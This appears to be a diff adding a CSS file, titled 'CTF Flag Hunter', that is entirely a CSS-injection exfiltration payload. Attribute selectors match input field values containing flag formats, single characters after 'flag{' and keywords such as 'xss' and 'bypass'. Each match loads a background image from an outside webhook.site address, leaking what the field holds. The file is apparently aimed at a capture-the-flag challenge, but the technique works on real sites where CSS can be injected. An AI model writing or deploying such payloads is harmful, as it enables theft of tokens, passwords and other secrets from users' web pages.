@@ -1,0 +1,52 @@
+
+/* CTF Flag Hunter - Targets common CTF flag formats */
+/* Webhook: https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497 */
+
+/* Common CTF flag formats */
+input[value*="flag{" i] { --flag-format1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?format=standard&found=true); }
+input[value*="ctf{" i] { --flag-format2: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?format=ctf&found=true); }
+input[value*="{" i] { --flag-format3: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?format=bracket&found=true); }
+input[value*="FLAG" i] { --flag-format4: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?format=uppercase&found=true); }
+
+/* Extract actual flag characters after "flag{" */
+input[value*="flag{a" i] { --flag-a: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=a&pos=after_flag); }
+input[value*="flag{b" i] { --flag-b: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=b&pos=after_flag); }
+input[value*="flag{c" i] { --flag-c: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=c&pos=after_flag); }
+input[value*="flag{d" i] { --flag-d: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=d&pos=after_flag); }
+input[value*="flag{e" i] { --flag-e: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=e&pos=after_flag); }
+input[value*="flag{h" i] { --flag-h: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=h&pos=after_flag); }
+input[value*="flag{t" i] { --flag-t: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=t&pos=after_flag); }
+input[value*="flag{x" i] { --flag-x: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=x&pos=after_flag); }
+input[value*="flag{s" i] { --flag-s: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=s&pos=after_flag); }
+input[value*="flag{w" i] { --flag-w: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?char=w&pos=after_flag); }
+
+/* Check for specific CTF keywords */
+input[value*="easy" i] { --keyword-easy: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/keyword?word=easy); }
+input[value*="hard" i] { --keyword-hard: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/keyword?word=hard); }
+input[value*="web" i] { --keyword-web: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/keyword?word=web); }
+input[value*="xss" i] { --keyword-xss: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/keyword?word=xss); }
+input[value*="bypass" i] { --keyword-bypass: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/keyword?word=bypass); }
+
+/* Apply all flag variables */
+html {
+  background-image:
+    var(--flag-format1, none),
+    var(--flag-format2, none),
+    var(--flag-format3, none),
+    var(--flag-format4, none),
+    var(--flag-a, none),
+    var(--flag-b, none),
+    var(--flag-c, none),
+    var(--flag-d, none),
+    var(--flag-e, none),
+    var(--flag-h, none),
+    var(--flag-t, none),
+    var(--flag-x, none),
+    var(--flag-s, none),
+    var(--flag-w, none),
+    var(--keyword-easy, none),
+    var(--keyword-hard, none),
+    var(--keyword-web, none),
+    var(--keyword-xss, none),
+    var(--keyword-bypass, none);
+}
